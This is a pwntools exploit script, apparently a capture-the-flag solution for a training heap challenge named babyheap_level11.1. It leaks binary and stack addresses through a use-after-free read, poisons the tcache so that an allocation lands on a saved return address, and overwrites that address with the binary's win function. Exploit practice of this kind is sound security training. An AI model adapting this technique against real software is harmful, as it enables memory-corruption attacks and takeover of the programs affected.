from pwn import *

# Start the process for the given binary
p = process("/challenge/babyheap_level11.1")
# Uncomment the following line to debug with GDB
# p = gdb.debug("/challenge/babyheap_level11.1")

# Load the binary ELF for symbol resolution
binary = ELF("/challenge/babyheap_level11.1")

def malloc_to_1(loc: bytes):
    # Allocate two memory blocks, free them, then allocate and setup new blocks
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'200')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'200')
    p.sendline(b'free')
    p.sendline(b'0')
    p.sendline(b'free')
    p.sendline(b'1')

    # Use scanf to input data into the previously freed memory locations
    p.sendline(b'scanf')
    p.sendline(b'1')
    p.recv()  # Receive the prompt for scanf
    p.sendline(loc)  # Send the location to be overwritten
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'200')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'200')

def scanf_to_pos(buf: bytes, pos: bytes):
    # Use scanf to write data to a specific position in memory
    p.sendline(b'scanf')
    p.sendline(pos)  # Position to write to
    p.sendline(buf)  # Data to write
    p.recv()  # Receive confirmation

# Setup the environment for memory leaks
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'100')
p.sendline(b'free')
p.sendline(b'0')

# Leak the base address of the binary
p.sendline(b'echo')
p.sendline(b'0')
p.sendline(b'112')
p.recvuntil(b'Data: ')
bin_echo = p.recvuntil(b'\n')[:-1]  # Read leaked data
binary_base = unpack(bin_echo, 'all') - binary.sym['bin_echo']  # Compute binary base address
binary.address = binary_base
print(p64(binary.address))  # Print the base address

# Leak the stack address
p.sendline(b'echo')
p.sendline(b'0')
p.sendline(b'120')
p.recvuntil(b'Data: ')
stack_leak = p.recvuntil(b'\n')[:-1]  # Read leaked stack address
ret_addr = unpack(stack_leak, 'all') + 374  # Compute the return address
print(p64(ret_addr))  # Print the computed return address

# Overwrite the memory to set up for exploit
malloc_to_1(p64(ret_addr))  # Use the computed return address
scanf_to_pos(p64(binary.sym.win), b'1')  # Overwrite with the address of the win function
p.sendline(b'quit')  # Exit the program

# Interact with the process to observe results
p.interactive()
